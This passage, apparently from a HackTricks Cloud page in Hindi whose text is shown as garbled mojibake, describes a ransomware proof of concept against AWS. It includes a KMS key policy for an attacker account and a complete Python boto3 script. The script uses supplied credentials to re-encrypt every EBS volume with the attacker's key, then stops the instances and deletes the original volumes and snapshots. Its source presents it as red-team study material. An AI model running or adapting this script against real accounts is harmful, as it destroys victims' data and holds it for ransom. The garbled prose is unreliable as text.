S3 ‡§∞‡•à‡§®‡§∏‡§Æ‡§µ‡•á‡§Ø‡§∞ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§®‡•§ ‡§Ø‡§π ‡§π‡§Æ‡§≤‡§æ ‡§ú‡•Å‡§°‡§º‡•á ‡§π‡•Å‡§è EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•Ä ‡§™‡•ç‡§∞‡§§‡§ø‡§Ø‡§æ‡§Ç ‡§∏‡•ç‡§®‡•à‡§™‡§∂‡•â‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§¨‡§®‡§æ‡§è‡§ó‡§æ, '‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞' ‡§ñ‡§æ‡§§‡•á ‡§∏‡•á ‡§∏‡§æ‡§∞‡•ç‡§µ‡§ú‡§®‡§ø‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§®‡§è EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•ã ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ, ‡§´‡§ø‡§∞ EC2 ‡§â‡§¶‡§æ‡§π‡§∞‡§£‡•ã‡§Ç ‡§∏‡•á ‡§Æ‡•Ç‡§≤ EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§¶‡•á‡§ó‡§æ ‡§î‡§∞ ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§π‡§ü‡§æ ‡§¶‡•á‡§ó‡§æ, ‡§î‡§∞ ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç ‡§®‡§è ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ó‡§è ‡§∏‡•ç‡§®‡•à‡§™‡§∂‡•â‡§ü ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§¶‡•á‡§ó‡§æ‡•§ ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

‡§á‡§∏‡§ï‡§æ ‡§™‡§∞‡§ø‡§£‡§æ‡§Æ ‡§ï‡•á‡§µ‡§≤ ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§π‡•à ‡§ú‡•ã ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§π‡•à‡§Ç‡•§

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

‡§Ø‡§π ‡§≠‡•Ä ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§®‡•á ‡§Ø‡•ã‡§ó‡•ç‡§Ø ‡§π‡•à ‡§ï‡§ø ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§®‡•á ‡§Æ‡•Ç‡§≤ EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•ã ‡§π‡§ü‡§æ‡§®‡•á ‡§î‡§∞ ‡§π‡§ü‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è EC2 ‡§â‡§¶‡§æ‡§π‡§∞‡§£‡•ã‡§Ç ‡§ï‡•ã ‡§∞‡•ã‡§ï‡§æ‡•§ ‡§Ö‡§¨ ‡§Æ‡•Ç‡§≤ ‡§Ö‡§®‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ö‡§≤‡•á ‡§ó‡§è ‡§π‡•à‡§Ç‡•§

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

‡§Ö‡§ó‡§≤‡§æ, '‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞' ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§®‡•Ä‡§§‡§ø ‡§™‡§∞ ‡§≤‡•å‡§ü‡•á‡§Ç ‡§î‡§∞ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§®‡•Ä‡§§‡§ø ‡§∏‡•á '‡§¨‡§æ‡§π‡§∞‡•Ä ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§®' ‡§®‡•Ä‡§§‡§ø ‡§®‡§ø‡§Ø‡§Æ ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§¶‡•á‡§Ç‡•§
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
‡§è‡§ï ‡§™‡§≤ ‡§∞‡•Å‡§ï‡•á‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§®‡§è ‡§∏‡•á‡§ü ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§®‡•Ä‡§§‡§ø ‡§ï‡§æ ‡§™‡•ç‡§∞‡§ö‡§æ‡§∞ ‡§π‡•ã ‡§∏‡§ï‡•á‡•§ ‡§´‡§ø‡§∞ '‡§™‡•Ä‡§°‡§º‡§ø‡§§' ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§µ‡§æ‡§™‡§∏ ‡§ú‡§æ‡§è‡§Ç ‡§î‡§∞ ‡§®‡§è ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§è‡§ï ‡§ï‡•ã ‡§Ö‡§ü‡•à‡§ö ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç‡•§ ‡§Ü‡§™ ‡§™‡§æ‡§è‡§Ç‡§ó‡•á ‡§ï‡§ø ‡§Ü‡§™ ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•ã ‡§Ö‡§ü‡•à‡§ö ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

‡§≤‡•á‡§ï‡§ø‡§® ‡§ú‡§¨ ‡§Ü‡§™ ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•á ‡§∏‡§æ‡§• EC2 ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•ã ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ø‡§π ‡§¨‡§∏ ‡§µ‡§ø‡§´‡§≤ ‡§π‡•ã ‡§ú‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ '‡§™‡•á‡§Ç‡§°‡§ø‡§Ç‡§ó' ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§∏‡•á '‡§∞‡•Å‡§ï‡§æ ‡§π‡•Å‡§Ü' ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§Æ‡•á‡§Ç ‡§π‡§Æ‡•á‡§∂‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§µ‡§æ‡§™‡§∏ ‡§ö‡§≤‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ö‡§ü‡•à‡§ö ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§®‡•Ä‡§§‡§ø ‡§Ö‡§¨ ‡§á‡§∏‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§¶‡•á‡§§‡•Ä‡•§

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

‡§Ø‡§π ‡§µ‡§π ‡§™‡§æ‡§Ø‡§•‡§® ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π '‡§™‡•Ä‡§°‡§º‡§ø‡§§' ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§≤‡§ø‡§è AWS ‡§ï‡•ç‡§∞‡•á‡§°‡•ç‡§∏ ‡§î‡§∞ ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•Ä ‡§ú‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡•Ä ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§∏‡§æ‡§∞‡•ç‡§µ‡§ú‡§®‡§ø‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§™‡§≤‡§¨‡•ç‡§ß AWS ARN ‡§Æ‡§æ‡§® ‡§≤‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ AWS ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§≠‡•Ä EC2 ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á ‡§∏‡§≠‡•Ä ‡§â‡§™‡§≤‡§¨‡•ç‡§ß EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•Ä ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§ï‡•â‡§™‡•Ä ‡§¨‡§®‡§æ‡§è‡§ó‡•Ä, ‡§´‡§ø‡§∞ ‡§π‡§∞ EC2 ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•ã ‡§∞‡•ã‡§ï ‡§¶‡•á‡§ó‡•Ä, ‡§Æ‡•Ç‡§≤ EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•ã ‡§Ö‡§ü‡•à‡§ö ‡§∏‡•á ‡§π‡§ü‡§æ ‡§¶‡•á‡§ó‡•Ä, ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§π‡§ü‡§æ ‡§¶‡•á‡§ó‡•Ä, ‡§î‡§∞ ‡§Ö‡§Ç‡§§‡§§‡§É ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•á ‡§¶‡•å‡§∞‡§æ‡§® ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ó‡§è ‡§∏‡§≠‡•Ä ‡§∏‡•ç‡§®‡•à‡§™‡§∂‡•â‡§ü ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§¶‡•á‡§ó‡•Ä‡•§ ‡§á‡§∏‡§∏‡•á ‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ '‡§™‡•Ä‡§°‡§º‡§ø‡§§' ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§ï‡•á‡§µ‡§≤ ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§∞‡§π ‡§ú‡§æ‡§è‡§Ç‡§ó‡•á‡•§ ‡§á‡§∏ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•á‡§µ‡§≤ ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§ï‡§∞‡•á‡§Ç, ‡§Ø‡§π ‡§µ‡§ø‡§®‡§æ‡§∂‡§ï‡§æ‡§∞‡•Ä ‡§π‡•à ‡§î‡§∞ ‡§∏‡§≠‡•Ä ‡§Æ‡•Ç‡§≤ EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§¶‡•á‡§ó‡§æ‡•§ ‡§Ü‡§™ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•Ä ‡§ó‡§à KMS ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§™‡•Å‡§®‡§∞‡•ç‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§∏‡•ç‡§®‡•à‡§™‡§∂‡•â‡§ü ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§â‡§®‡§ï‡•á ‡§Æ‡•Ç‡§≤ ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§Æ‡•á‡§Ç ‡§¨‡§π‡§æ‡§≤ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ü‡§™‡§ï‡•ã ‡§Ø‡§π ‡§¨‡§§‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡§æ ‡§π‡•Ç‡§Ç ‡§ï‡§ø ‡§Ø‡§π ‡§Ö‡§Ç‡§§‡§§‡§É ‡§è‡§ï ‡§∞‡•à‡§®‡§∏‡§Æ‡§µ‡•á‡§Ø‡§∞ PoC ‡§π‡•à‡•§
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **‡§π‡§Æ‡§æ‡§∞‡§æ ‡§Ö‡§®‡•Å‡§∏‡§∞‡§£ ‡§ï‡§∞‡•á‡§Ç** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
